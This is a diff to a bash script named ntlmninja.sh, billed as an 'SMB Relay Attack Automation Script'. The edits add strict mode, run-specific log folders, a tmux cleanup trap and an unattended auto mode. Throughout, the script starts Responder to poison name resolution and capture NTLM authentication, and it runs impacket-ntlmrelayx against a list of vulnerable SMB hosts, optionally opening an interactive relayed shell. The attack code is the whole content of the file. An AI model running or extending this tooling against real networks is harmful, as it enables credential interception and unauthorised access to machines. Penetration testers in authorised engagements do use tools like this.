@@ -1,4 +1,6 @@
 #!/bin/bash
+set -euo pipefail
+IFS=$'\n\t'
 
 # =============================================================
 # ntlmninja.sh - SMB Relay Attack Automation Script
@@ -6,10 +8,19 @@
 # Author: Howell King Jr. | Github: https://github.com/sp3ttr0
 # =============================================================
 
-responder_config_file="/etc/responder/Responder.conf"
+responder_config_file="${RESPONDER_CONF:-/etc/responder/Responder.conf}"
 session_name="smb_relay_attack"
 TARGET_SMB_FILE="vulnerable_smb_targets.txt" 
 enable_interactive=false
+AUTO_MODE=false
+
+RUN_ID=$(date +%s)
+LOG_DIR="logs_${RUN_ID}"
+mkdir -p "$LOG_DIR"
+
+ATTACK_LOG="${LOG_DIR}/attack.log"
+RESPONDER_LOG="${LOG_DIR}/responder.log"
+RELAY_LOG="${LOG_DIR}/relay.log"
 
 # Define color codes
 RED='\033[0;31m'
@@ -21,6 +32,20 @@ RESET='\033[0m'
 
 # Network interface (dynamically detected by default)
 network_interface="$(ip route | awk '/default/ {print $5; exit}')"
+
+cleanup() {
+    exit_code=$?
+    
+    if [ $exit_code -ne 0 ]; then
+        echo -e "${YELLOW}[*] Script exited unexpectedly. Cleaning up...${RESET}"
+        
+        if tmux has-session -t "$session_name" 2>/dev/null; then
+            tmux kill-session -t "$session_name"
+        fi
+    fi
+}
+
+trap cleanup EXIT INT TERM
 
 # Print help
 print_help() {
@@ -50,10 +75,10 @@ banner() {
 # Check if a tool is installed
 check_tool() {
     echo -e "[*] Checking ${YELLOW}$1${RESET} if installed..."
-    command -v "$1" > /dev/null 2>&1 || {
+    if ! command -v "$1" &>/dev/null; then
         echo -e "${RED}[!] $1 is not installed. Please install it first. Exiting.${RESET}"
         exit 1
-    }
+    fi
 }
 
 # Validate network interface
@@ -111,7 +136,9 @@ start_tmux_window() {
     local command=$3
     
     # Create the window in the tmux session
-    tmux new-window -t "$session_name" -n "$window_name"
+    if ! tmux list-windows -t "$session_name" | grep -q "$window_name"; then
+        tmux new-window -t "$session_name" -n "$window_name"
+    fi
     
     # Send the command to the new tmux window
     tmux send-keys -t "$session_name:$window_name" "$command" C-m
@@ -119,7 +146,7 @@ start_tmux_window() {
 
 # Function to execute SMB relay attack in tmux
 run_smb_relay_attack() {
-    echo -e "${BLUE}[*] Starting SMB Relay Attack...${RESET}" | tee -a attack.log
+    echo -e "${BLUE}[*] Starting SMB Relay Attack...${RESET}" | tee -a "$ATTACK_LOG"
 
     # Ensure tmux session exists
     if ! tmux has-session -t "$session_name" 2>/dev/null; then
@@ -129,7 +156,7 @@ run_smb_relay_attack() {
 
     # Start Responder in a tmux window
     echo -e "${CYAN}Starting Responder on interface $network_interface...${RESET}"
-    start_tmux_window "$session_name" "responder" "responder -I $network_interface 2>&1 | tee -a responder_$(date +%s).log" || {
+    start_tmux_window "$session_name" "responder" "responder -I $network_interface 2>&1 | tee -a $RESPONDER_LOG" || {
         echo -e "${RED}Failed to start Responder.${RESET}"
         exit 1
     }
@@ -137,7 +164,7 @@ run_smb_relay_attack() {
     # Start ntlmrelayx in another tmux window
     echo -e "${CYAN}Starting impacket-ntlmrelayx with target file ${TARGET_SMB_FILE}...${RESET}"
 
-    relay_command="impacket-ntlmrelayx -smb2support -tf ${TARGET_SMB_FILE} 2>&1 | tee -a relay_$(date +%s).log"
+    relay_command="impacket-ntlmrelayx -smb2support -tf \"${TARGET_SMB_FILE}\" 2>&1 | tee -a \"${RELAY_LOG}\""
     if [ "$enable_interactive" = true ]; then
         echo -e "${YELLOW}[+] Enabling interactive shell (--interactive) in ntlmrelayx.${RESET}"
         relay_command+=" --interactive"
@@ -180,31 +207,37 @@ fi
 # Show the banner
 banner
 
+echo -e "${BLUE}[*] Logs will be stored in: ${LOG_DIR}${RESET}"
+
 # Start SMB Relay Attack
 if tmux has-session -t "$session_name" 2>/dev/null; then
     echo -e "${YELLOW}[!] Tmux session '${session_name}' already exists.${RESET}"
     echo -e "${BLUE}Do you want to:${RESET}"
     echo -e "  [a] Attach to existing session"
     echo -e "  [k] Kill existing session"
-    read -rp "$(echo -e "${YELLOW}Choose [a/k]: ${RESET}")" user_choice
+    if [ "$AUTO_MODE" = true ]; then
+        tmux kill-session -t "$session_name"
+    else
+        read -rp "$(echo -e "${YELLOW}Choose [a/k]: ${RESET}")" user_choice
 
-    case "$user_choice" in
-        [aA])
-            echo -e "${GREEN}[*] Attaching to existing tmux session...${RESET}"
-            tmux -CC attach-session -t "$session_name"
-            exit 0
-            ;;
-        [kK])
-            echo -e "${RED}[*] Killing existing tmux session...${RESET}"
-            tmux kill-session -t "$session_name"
-            echo -e "${GREEN}[*] Session killed. Exiting.${RESET}"
-            exit 0
-            ;;
-        *)
-            echo -e "${RED}[!] Invalid choice. Exiting.${RESET}"
-            exit 1
-            ;;
-    esac
+        case "$user_choice" in
+            [aA])
+                echo -e "${GREEN}[*] Attaching to existing tmux session...${RESET}"
+                tmux -CC attach-session -t "$session_name"
+                exit 0
+                ;;
+            [kK])
+                echo -e "${RED}[*] Killing existing tmux session...${RESET}"
+                tmux kill-session -t "$session_name"
+                echo -e "${GREEN}[*] Session killed. Exiting.${RESET}"
+                exit 0
+                ;;
+            *)
+                echo -e "${RED}[!] Invalid choice. Exiting.${RESET}"
+                exit 1
+                ;;
+        esac
+    fi
 fi
 
 # Check required arguments
